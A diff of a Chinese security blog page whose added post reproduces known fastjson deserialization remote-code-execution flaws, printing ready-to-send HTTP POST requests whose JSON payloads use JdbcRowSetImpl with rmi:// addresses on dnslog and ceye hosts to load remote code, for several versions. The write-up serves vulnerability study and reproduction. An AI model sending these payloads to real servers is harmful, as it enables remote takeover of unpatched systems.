@@ -6,14 +6,15 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="hexo便捷网站配置, BUPT PWN Web安全 Java安全">
+    <meta name="keywords" content="fastjson漏洞历史&amp;poc复现分析, BUPT PWN Web安全 Java安全">
     <meta name="baidu-site-verification" content="fmlEuI34ir">
     <meta name="google-site-verification" content="KeoTn_OFy4ndJwXNmm2gMeQfPhd7alqE9vQDwI32KCY">
-    <meta name="description" content="本地新建md文章# 在hexo 配置好的路经打开窗口
-# D:\MarkdownFiles\blog\source
+    <meta name="description" content="参考资料
 
-hexo new &#34;my aticle name&#34;
-# 此时会在博客目录下生成一个./_post/atcitle_name">
+fastjson poc
+
+郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！
+0x01 Fastjson&amp;lt;=1.2.24反序列化远程代码执行">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -21,7 +22,7 @@ hexo new &#34;my aticle name&#34;
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>hexo便捷网站配置 | thonsun&#39;s blog</title>
+    <title>fastjson漏洞历史&amp;poc复现分析 | thonsun&#39;s blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -550,13 +551,13 @@ hexo new &#34;my aticle name&#34;
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/13.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/18.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        hexo便捷网站配置
+                        fastjson漏洞历史&amp;poc复现分析
                     </div>
                 </div>
             </div>
@@ -668,12 +669,12 @@ hexo new &#34;my aticle name&#34;
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/工具使用/" target="_blank">
-                                <span class="chip bg-color">工具使用</span>
+                            <a href="/tags/javasec/" target="_blank">
+                                <span class="chip bg-color">javasec</span>
                             </a>
                         
-                            <a href="/tags/blog/" target="_blank">
-                                <span class="chip bg-color">blog</span>
+                            <a href="/tags/poc/" target="_blank">
+                                <span class="chip bg-color">poc</span>
                             </a>
                         
                     </div>
@@ -684,8 +685,8 @@ hexo new &#34;my aticle name&#34;
                     <div class="post-cate">
                         <i class="fa fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/tools/" class="post-category" target="_blank">
-                                tools
+                            <a href="/categories/vulhub/" class="post-category" target="_blank">
+                                vulhub
                             </a>
                         
                     </div>
@@ -696,7 +697,7 @@ hexo new &#34;my aticle name&#34;
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2019-06-28
+                    2020-12-20
                 </div>
 
                 <div class="post-author info-break-policy">
@@ -710,7 +711,7 @@ hexo new &#34;my aticle name&#34;
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        762
+                        649
                     </div>
                     
 
@@ -734,92 +735,94 @@ hexo new &#34;my aticle name&#34;
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h3 id="本地新建md文章"><a href="#本地新建md文章" class="headerlink" title="本地新建md文章"></a>本地新建md文章</h3><pre class="line-numbers language-shell"><code class="language-shell"># 在hexo 配置好的路经打开窗口
-# D:\MarkdownFiles\blog\source
-
-hexo new "my aticle name"
-# 此时会在博客目录下生成一个./_post/atcitle_name.md的markdown文件，通常就是用typora等markdown编辑器编辑这个文件下的博客文章
-# markdown的语法与hexo的文章格式
-# 以下所有命令都在blog的根目录下运行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h3 id="hexo加密文章"><a href="#hexo加密文章" class="headerlink" title="hexo加密文章"></a>hexo加密文章</h3><p>未写完&amp;私密记录分享</p>
-<p>1.安装插件：</p>
-<p><code>npm install --save hexo-blog-encrypt</code></p>
-<p>2.修改配置 <code>_config.yml</code> 中启用该插件:</p>
-<pre><code># Security
-##
-encrypt:
-    enable: true</code></pre><p>3.文章配置</p>
-<pre><code>---
-title: hello world
-date: 2016-03-30 21:18:02
-tags:
-    - fdsfadsfa
-    - fdsafsdaf
-password: Mike
-abstract: Welcome to my blog, enter password to read.
-message: Welcome to my blog, enter password to read.
----</code></pre><ul>
-<li>password: 是该博客加密使用的密码</li>
-<li>abstract: 是该博客的摘要，会显示在博客的列表页</li>
-<li>message: 这个是博客查看时，密码输入框上面的描述性文字</li>
-</ul>
-<h3 id="发布到github"><a href="#发布到github" class="headerlink" title="发布到github"></a>发布到github</h3><pre class="line-numbers language-shell"><code class="language-shell">hexo clean 每当有站点、主题的配置更新时刷新所有文件格式
-hexo g # 生成静态的文件
-hexo d # push到github进行展示
-# hexo g -d
-#  hexo s --debug 本地调试样式localhost:4000
-
-# 配置hexo 免密发布
-# 1. add github ssh key;测试 ssh -T git@github.com
-# 2. 编辑_config.yml文件，修改文件里面的deploy，
-deploy:
-type: git
-repo: git@github.com:mykonons/mykonons.github.io.git
-branch: master<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<a id="more"></a>
-
-<p>###hexo seo优化</p>
-<pre><code>https://hoxis.github.io/Hexo+Next%20SEO%E4%BC%98%E5%8C%96.html</code></pre><h3 id="hexo的网站配置"><a href="#hexo的网站配置" class="headerlink" title="hexo的网站配置"></a>hexo的网站配置</h3><pre class="line-numbers language-shell"><code class="language-shell"># 参考：https://hexo.io/zh-cn/docs/configuration
-# 常用的编写博客命令
-hexo init [文件夹] #初始化网站。如果没有folder提供，Hexo将在当前目录中设置网站。
-hexo new [layout] name # 默认新建一个markdown的笔记
-# 删除页面 直接删/source/xxx/的新建页面就可以了，主页会相应修改<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h3 id="next的主题配置"><a href="#next的主题配置" class="headerlink" title="next的主题配置"></a>next的主题配置</h3><pre class="line-numbers language-shell"><code class="language-shell"># 参考：https://theme-next.iissnan.com/theme-settings.html#categories-page
-# 修改 ./themes/next/* 的主题文件配置
-# 侧边栏
-# 底部的浏览统计
-# 文章评论
-# 头衔等等<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h3 id="其他的技术"><a href="#其他的技术" class="headerlink" title="其他的技术"></a>其他的技术</h3><pre class="line-numbers language-shell"><code class="language-shell"># 图床技术：解决图片插入保存的问题
-# 浏览统计 解决卜算子失效
-https://juejin.im/post/5bbc954a5188255c7c657ca5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<h3 id="在markdown本地编写的文章解决图片"><a href="#在markdown本地编写的文章解决图片" class="headerlink" title="在markdown本地编写的文章解决图片"></a>在markdown本地编写的文章解决图片</h3><pre class="line-numbers language-shell"><code class="language-shell"># hexo的发布本地markdown笔记为html
-hexo clean # 会删除本地的所有配置的静态seo网页
-# 一般流程实施
-hexo new "title"
-markdown 中编写头部的categories和tags
-hexo g -d #等待一分钟即可，github上会有延时
-
-# <!-- more --> 手动设置主页分割
-
-####################
-# 实践解决 typora解决本地图片与生成html路经的正确配置
-# 文件头：typora-root-url: .. + 偏好设置->图片设置->{../images + 优先使用相对路径}
-# 参考 ：https://anynote.me/1036055241.html
-# 对有修改后续更新的博文发布到GitHub：hexo g -d
-####################<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>偏好设置：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/1561813472533.png" alt="1561813472533"></p>
-<h3 id="删除npm的安装包"><a href="#删除npm的安装包" class="headerlink" title="删除npm的安装包"></a>删除npm的安装包</h3><ul>
-<li><p>方案一：npm uninstall xxx</p>
-</li>
-<li><p>方案二：粗暴删除文件夹</p>
-<p>  <img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/1561813283410.png" alt="1561813283410"></p>
-</li>
-</ul>
-<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><blockquote>
-<p><a href="https://sunhwee.com/posts/6e8839eb.html" target="_blank" rel="noopener">matery 主题blog</a></p>
+                <p>参考资料</p>
+<blockquote>
+<p><a href="https://www.ascotbe.com/1899/11/30/Cms/Fastjson/" target="_blank" rel="noopener">fastjson poc</a></p>
 </blockquote>
+<p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p>
+<h4 id="0x01-Fastjson-lt-1-2-24反序列化远程代码执行漏洞"><a href="#0x01-Fastjson-lt-1-2-24反序列化远程代码执行漏洞" class="headerlink" title="0x01 Fastjson<=1.2.24反序列化远程代码执行漏洞"></a>0x01 Fastjson&lt;=1.2.24反序列化远程代码执行漏洞</h4><ul>
+<li><p>披露时间</p>
+<pre><code>    2017-3-15</code></pre></li>
+<li><p><code>CVE</code>编号</p>
+<pre><code>    无</code></pre></li>
+<li><p>影响版本</p>
+<pre><code>    Fastjson&lt;=1.2.24</code></pre></li>
+<li><p>漏洞分析</p>
+<pre><code>    fastjson在处理以@type形式传入的类的时候，会默认调用该类的共有set\get\is函数</code></pre></li>
+</ul>
+<h5 id="请求方式"><a href="#请求方式" class="headerlink" title="请求方式:"></a>请求方式:</h5><pre><code>POST</code></pre><h5 id="POC"><a href="#POC" class="headerlink" title="POC:"></a>POC:</h5><ul>
+<li>直接发送数据包即可</li>
+</ul>
+<pre><code>[![image-20200220165248326](https://github.com/Ascotbe/Random-img/blob/master/CMS/Fastjson/1.png?raw=true)**image-20200220165248326**](https://github.com/Ascotbe/Random-img/blob/master/CMS/Fastjson/1.png)
+
+
+
+```
+  POST / HTTP/1.1
+  Host: you_ip
+  Accept-Encoding: gzip, deflate
+  Accept: */*
+  Accept-Language: en
+  User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+  Connection: close
+  Content-Type: application/json
+  Content-Length: 170
+
+  {
+      "b":{
+          "@type":"com.sun.rowset.JdbcRowSetImpl",
+          "dataSourceName":"rmi://222.dob132.dnslog.cn//Exploit",
+          "autoCommit":true
+      }
+  }
+```</code></pre><ul>
+<li>注意<code>rmi://XXXX//Exploit</code>这段到代码只需要替换<code>xxxx</code>的值即可</li>
+</ul>
+<pre><code>[![image-20200220165312932](https://github.com/Ascotbe/Random-img/blob/master/CMS/Fastjson/2.png?raw=true)**image-20200220165312932**](https://github.com/Ascotbe/Random-img/blob/master/CMS/Fastjson/2.png?raw=true)</code></pre><h4 id="0x02-Fastjson-1-2-47-远程命令执行漏洞"><a href="#0x02-Fastjson-1-2-47-远程命令执行漏洞" class="headerlink" title="0x02 Fastjson 1.2.47 远程命令执行漏洞"></a>0x02 Fastjson 1.2.47 远程命令执行漏洞</h4><ul>
+<li><p>披露时间</p>
+<pre><code>    2019-7-15</code></pre></li>
+<li><p><code>CVE</code>编号</p>
+<pre><code>    无</code></pre></li>
+<li><p>影响版本</p>
+<pre><code>    Fastjson&lt;=1.2.47</code></pre></li>
+<li><p>漏洞分析</p>
+<pre><code>    fastjson于1.2.24版本后增加了反序列化白名单，而在1.2.48以前的版本中，攻击者可以利用特殊构造的json字符串绕过白名单检测，成功执行任意命令。</code></pre></li>
+</ul>
+<h5 id="请求方式-1"><a href="#请求方式-1" class="headerlink" title="请求方式:"></a>请求方式:</h5><pre><code>POST</code></pre><h5 id="POC-1"><a href="#POC-1" class="headerlink" title="POC:"></a>POC:</h5><ul>
+<li>直接发送数据包即可</li>
+</ul>
+<pre><code>[![image-20200220170302444](https://github.com/Ascotbe/Random-img/blob/master/CMS/Fastjson/3.png?raw=true)**image-20200220170302444**](https://github.com/Ascotbe/Random-img/blob/master/CMS/Fastjson/3.png?raw=true)
+
+
+
+```
+  POST / HTTP/1.1
+  Host: you_ip
+  Accept-Encoding: gzip, deflate
+  Accept: */*
+  Accept-Language: en
+  User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+  Connection: close
+  Content-Type: application/json
+  Content-Length: 268
+
+  {
+      "a":{
+          "@type":"java.lang.Class",
+          "val":"com.sun.rowset.JdbcRowSetImpl"
+      },
+      "b":{
+          "@type":"com.sun.rowset.JdbcRowSetImpl",
+          "dataSourceName":"rmi://123.dd.evhyf5.dnslog.cn/Exploit",
+          "autoCommit":true
+      }
+  }
+```</code></pre><ul>
+<li>注意<code>rmi://XXXX//Exploit</code>这段到代码只需要替换<code>xxxx</code>的值即可</li>
+</ul>
+<pre><code>[![image-20200220170351359](https://github.com/Ascotbe/Random-img/blob/master/CMS/Fastjson/4.png?raw=true)**image-20200220170351359**](https://github.com/Ascotbe/Random-img/blob/master/CMS/Fastjson/4.png?raw=true)</code></pre><p>Fastjson 1.2.51</p>
+<pre><code> payload = "{\"name\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"x\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://%s.xw2kit.ceye.io:1066/Exploit\",\"autoCommit\":true}}}" %(url)</code></pre><p>Fastjson 1.2.61</p>
+<pre><code>https://github.com/jas502n/fastjson-1.2.61-RCE</code></pre><p>Fastjson 1.2.62</p>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -988,7 +991,7 @@ hexo g -d #等待一分钟即可，github上会有延时
                     </span>
                     <a href="https://thonsun.github.io" class="b-link-green">thonsun's blog</a>
                     <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
-                    <a href="/2019/06/28/hexo-bian-jie-wang-zhan-pei-zhi/" class="b-link-green">hexo便捷网站配置</a>
+                    <a href="/2020/12/20/fastjson-lou-dong-li-yong-li-shi-fu-xian-poc-fen-xi/" class="b-link-green">fastjson漏洞历史&amp;poc复现分析</a>
                 </p>
             </div>
 
@@ -1011,7 +1014,7 @@ hexo g -d #等待一分钟即可，github上会有延时
         repo: 'thonsun.github.io',
         owner: 'thonsun',
         admin: ["thonsun"],
-        id: '2019/06/28/hexo-bian-jie-wang-zhan-pei-zhi/',
+        id: '2020/12/20/fastjson-lou-dong-li-yong-li-shi-fu-xian-poc-fen-xi/',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -1334,50 +1337,32 @@ hexo g -d #等待一分钟即可，github上会有延时
             <div class="article-badge left-badge text-color">
                 <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2019/06/29/linux-xia-zhan-yi-chu-de-li-yong-shou-fa/">
+                <a href="/2020/12/24/java-fan-xu-lie-hua-lou-dong-li-yong-fen-xi/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="linux下栈溢出的利用手法">
+                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="java-反序列化漏洞利用分析">
                         
-                        <span class="card-title">linux下栈溢出的利用手法</span>
+                        <span class="card-title">java-反序列化漏洞利用分析</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            linux下pwn的入门环境
-Ubuntu16.04
-pwntools
-pwndbg
-
-即开始pwn的旅程，GitHub上 有在Ubuntu16.04上面一键布置的bash脚本
-熟悉linux下的常用命令# 可以安装使用terminator
+                            
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return
                         
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2019-06-29
+                            <i class="fa fa-clock-o fa-fw icon-date"></i>2020-12-24
                         </span>
                         <span class="publish-author">
                             
-                            <i class="fa fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/pwn/" class="post-category" target="_blank">
-                                    pwn
-                                </a>
-                            
-                            
                         </span>
                     </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/stack/" target="_blank">
-                        <span class="chip bg-color">stack</span>
-                    </a>
-                    
                 </div>
                 
             </div>
@@ -1386,54 +1371,56 @@ pwndbg
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge right-badge text-color">
-                本篇&nbsp;<i class="fa fa-dot-circle-o"></i>
+                下一篇&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2019/06/28/hexo-bian-jie-wang-zhan-pei-zhi/">
+                <a href="/2020/12/04/huan-jing-pei-zhi/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/13.jpg" class="responsive-img" alt="hexo便捷网站配置">
+                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="环境配置">
                         
-                        <span class="card-title">hexo便捷网站配置</span>
+                        <span class="card-title">环境配置</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            本地新建md文章# 在hexo 配置好的路经打开窗口
-# D:\MarkdownFiles\blog\source
+                            
+使用电脑浏览效果更佳！
 
-hexo new "my aticle name"
-# 此时会在博客目录下生成一个./_post/atcitle_name
+整理常用的win | linux环境，包括开发用环境：Jetbrain全家桶crack过程；
+
+
+Jetbrains全家桶
+关注最新的 refer 【重要】
+
+
+2.以IDEA为例
+2.1 官网下载对应版本 20
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-06-28
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-12-04
                             </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/tools/" class="post-category" target="_blank">
-                                    tools
+                            <a href="/categories/环境配置/" class="post-category" target="_blank">
+                                    环境配置
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
-
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/工具使用/" target="_blank">
-                        <span class="chip bg-color">工具使用</span>
-                    </a>
-                    
-                    <a href="/tags/blog/" target="_blank">
-                        <span class="chip bg-color">blog</span>
+                    <a href="/tags/环境配置/" target="_blank">
+                        <span class="chip bg-color">环境配置</span>
                     </a>
                     
                 </div>
